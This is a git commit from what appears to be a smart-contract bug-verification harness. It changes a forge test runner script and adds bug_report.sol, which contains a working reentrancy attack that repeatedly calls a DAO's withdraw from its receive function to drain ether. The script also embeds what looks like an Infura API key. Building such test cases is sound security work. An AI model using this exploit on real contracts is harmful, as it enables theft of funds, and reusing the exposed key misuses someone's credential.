3e2ab2b5ed30b973ca59bdcd0e84e4ff2bb7f91a
Stephanie Ma <ym363@cornell.edu>
2025-06-13 23:11:13 -0400

    DAO Test

--- deadbug/submitter/src/run_test.sh
+++ deadbug/submitter/src/run_test.sh
@@ -12,8 +12,9 @@ forge init bin/bug-verify &> /dev/null
 
 # move bug and inv file to test folder
 dest="./bin/bug-verify/test"
+mkdir -p $dest/inv
 cp -- "$bug" "$dest/"
-cp -- "$inv" "$dest/"
+cp -- "$inv" "$dest/inv/"
 
 cd bin/bug-verify 
 
@@ -21,11 +22,12 @@ cd bin/bug-verify
   export TARGET="$addr"
   export MAINNET_RPC_URL="https://mainnet.infura.io/v3/27ce2d06142643c28dc2d477400fd430"
 
-  JSON_OUT="$(forge test \
-    --match-contract "^Test" \
+  JSON_OUT="$(forge test test/inv/* \
     --fork-url "$MAINNET_RPC_URL" \
     --fork-block-number "$block_num" \
     --json 2>&1)" || true
+
+  #echo "$JSON_OUT"
 
   curr="$(basename "$PWD")"
   cd .. || exit 1
---
+++ deadbug/submitter/test/bug_report.sol
@@ -0,0 +1,39 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.19;
+
+import "forge-std/Test.sol";
+
+interface IDAO {
+    function withdraw(uint256 amount) external;
+}
+
+contract Attack {
+    IDAO public dao;
+    constructor(address daoAddr) payable {
+        dao = IDAO(daoAddr);
+    }
+
+    function attack() external payable {
+        (bool ok, ) = address(dao).call{ value: msg.value }("");
+        require(ok, "deposit failed");
+        dao.withdraw(msg.value);
+    }
+
+    receive() external payable {
+        uint256 bal = address(dao).balance;
+        if (bal >= msg.value) {
+            dao.withdraw(msg.value);
+        }
+    }
+}
+
+contract AttackHelper is Test {
+    Attack public att;
+
+    function bug(uint256 forkId, address daoAddr) internal {
+        vm.selectFork(forkId);
+
+        att = new Attack{ value: 1 ether }(daoAddr);
+        att.attack{ value: 1 ether }();
+    }
+}
